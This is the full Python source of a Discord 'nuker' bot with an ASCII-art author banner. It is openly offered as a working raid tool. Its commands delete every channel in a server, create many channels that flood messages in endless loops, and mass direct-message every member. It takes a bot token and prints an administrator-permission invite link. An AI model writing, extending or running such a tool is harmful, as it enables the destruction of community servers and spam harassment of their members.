import discord
from discord.ext import commands
from pystyle import Center, Colorate, Colors, Anime
import colorama
import os

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""))

token = input("Bot Token -> ")
PREFIX = "!"

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
created_channel_ids = []
spamming = False
message_spam = ""

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user.name}")
    print(f"Invite: https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8")
    print("Commands:")
    print("!nuke [Channels Number], [Channels Name], [Message Spam]")
    print("!spam_channels [Channels Number], [Channels Name], [Message Spam]")
    print("!delete_channels")
    print("!stop_message_spam")
    print("!send_pm [Message]")

async def spam_channel(channel):
    global spamming, message_spam
    while spamming:
        try:
            await channel.send(message_spam)
        except:
            pass

@bot.command()
async def nuke(ctx, *, args):
    global message_spam, spamming
    args = [arg.strip() for arg in args.split(',')]
    if len(args) < 3:
        return
    
    try:
        channels_number = int(args[0])
    except:
        return
    
    channels_name = args[1]
    message_spam = ", ".join(args[2:])
    guild = ctx.guild
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    created_channel_ids.clear()
    spamming = True
    for _ in range(channels_number):
        new_channel = await guild.create_text_channel(channels_name)
        created_channel_ids.append(new_channel.id)
        bot.loop.create_task(spam_channel(new_channel))

@bot.command()
async def spam_channels(ctx, *, args):
    global message_spam, spamming
    args = [arg.strip() for arg in args.split(',')]
    if len(args) < 3:
        return
    
    try:
        channels_number = int(args[0])
    except:
        return
    
    channels_name = args[1]
    message_spam = ", ".join(args[2:])
    guild = ctx.guild
    
    spamming = True
    for _ in range(channels_number):
        new_channel = await guild.create_text_channel(channels_name)
        created_channel_ids.append(new_channel.id)
        bot.loop.create_task(spam_channel(new_channel))

@bot.command()
async def stop_message_spam(ctx):
    global spamming
    spamming = False
    print("Spam Stopped.")

@bot.command()
async def delete_channels(ctx):
    global spamming
    spamming = False
    guild = ctx.guild
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

@bot.command()
async def send_pm(ctx, *, message: str):
    guild = ctx.guild
    async for member in guild.fetch_members(limit=None):
        if member != ctx.author:
            try:
                await member.send(message)
            except:
                pass

try:
    bot.run(token)
except:
    print("Invalid Token")
